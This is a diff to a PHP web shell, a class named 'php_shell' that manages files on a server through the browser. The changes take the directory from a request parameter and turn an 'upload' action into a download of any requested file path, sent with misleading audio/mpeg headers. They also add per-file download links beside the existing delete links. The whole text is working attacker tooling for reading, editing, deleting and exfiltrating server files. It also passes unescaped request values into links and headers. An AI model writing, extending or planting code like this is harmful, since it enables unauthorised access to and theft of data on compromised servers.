@@ -34,31 +34,32 @@ class fileCustom
 	public $size = -1;
 	public $chmod = false;
 	
-	public function __construct($file)
+	public $dir = false;
+	
+	public function __construct($file, $dir = false)
 	{
-		
-		if(!file_exists($file))
-		{
-			return false;
-		}
-		$this->file = $file;
+		$this->dir = ($dir) ? $dir . "/" : "";
+		$this->file = $this->dir . $file;
 		
 		if(is_dir($this->file))
 		{
 			$this->is_dir = true;
+			$this->owner = posix_getpwuid( fileowner($this->file . "/"))["name"];
+			$this->chmod = substr(sprintf('%o', fileperms($this->file . "/")), -4);
 		} else {
 			$this->is_dir = false;
-		}
-		
-		$this->is_writable = (is_writable($this->file)) ? true : false;
-		
-		if(!$this->is_dir)
-		{
+			$this->owner = posix_getpwuid( fileowner($this->file))["name"];
+			$this->chmod = substr(sprintf('%o', fileperms($this->file)), -4);
 			$this->size = round((int)filesize($this->file) / 1024, 2);
 		}
+		$this->is_writable = (is_writable($this->file)) ? true : false;
+		if(!file_exists($file) && !is_dir($this->file . "/"))
+		{
+			return false;
+		}
 		
-		$this->owner = posix_getpwuid( fileowner($this->file))["name"];
-		$this->chmod = substr(sprintf('%o', fileperms($this->file)), -4);
+		
+		
 	}
 	
 	public function isWriteble()
@@ -82,6 +83,7 @@ class fileCustom
 	
 	public function getChmod()
 	{
+		
 		return $this->chmod;
 	}
 }
@@ -213,11 +215,18 @@ class php_shell {
 		
 		if($action == "upload")
 		{
-			if(isset($_FILES["file"]) && $_FILES["file"]["name"])
-			{
-				$this->uploadFile("file", $_FILES["file"]["name"]);
-			}
+			$name = (isset($_REQUEST["name"])) ? $_REQUEST["name"] : "unknow";
+			$content = file_get_contents($file);
+			header('Connection: close');
+			header('Content-type: audio/mpeg');
+			header('Content-length: ' . strlen($content));
+			header('Content-Disposition: attachment; filename="'.$name.'"');
+			header("Content-Transfer-Encoding: binary"); 
+			header("Content-Type: audio/mpeg, audio/x-mpeg, audio/x-mpeg-3, audio/mpeg3");
+			echo $content;
+			die;
 		}
+		
 		
 		if($action == "save" && isset($_REQUEST["data"]))
 		{
@@ -344,7 +353,7 @@ $shell->dispatcher();
 			<div class="dialog edit-block">
 				<form action="" method="POST">
 					
-					<textarea name="data" style="width: 800px; height: 400px;"><?php echo $shell->dataOpenedFile; ?></textarea>
+					<textarea name="data" style='width: 800px; height: 400px;'><?php echo htmlentities($shell->dataOpenedFile); ?></textarea>
 					<input type="hidden" name="a" value="save" />
 					<br /><br />
 					<button>Save</button>
@@ -362,13 +371,13 @@ $shell->dispatcher();
 				<?php if(count($shell->filesCurrentDir) > 0) : ?>
 				<?php foreach($shell->filesCurrentDir as $id => $filename): ?>
 				<tr>
-					<?php $file = new fileCustom($filename); ?>
+					<?php $file = new fileCustom($filename, (isset($_REQUEST["dir"])) ? $_REQUEST["dir"] : false); ?>
 					
 					<td><a style='color:<?php echo ($file->isWriteble()) ? "green" : "red"; ?>' href="/?dir=<?php echo $shell->currentDir . "/" .  $filename; ?>"><?php echo $filename; ?></a></td>
 					<td><?php echo $file->getOwner(); ?>
 					<td><?php echo $file->getSize(); ?></td>
 					<td><?php echo $file->getChmod(); ?></td>
-					<td><a class="del" href="/?dir=<?php echo $shell->currentDir; ?>&a=del&file=<?php echo $shell->currentDir . "/" .  $filename; ?>">del</a></td>
+					<td><a class="del" href="/?dir=<?php echo $shell->currentDir; ?>&a=del&file=<?php echo $shell->currentDir . "/" .  $filename; ?>">del</a> <a class="upload" target="_blank" href="/?dir=<?php echo $shell->currentDir; ?>&a=upload&file=<?php echo $shell->currentDir . "/" .  $filename; ?>&name=<?php echo $filename; ?>">upload</a></td>
 				</tr>
 				<?php endforeach; ?>
 				<?php else: ?>
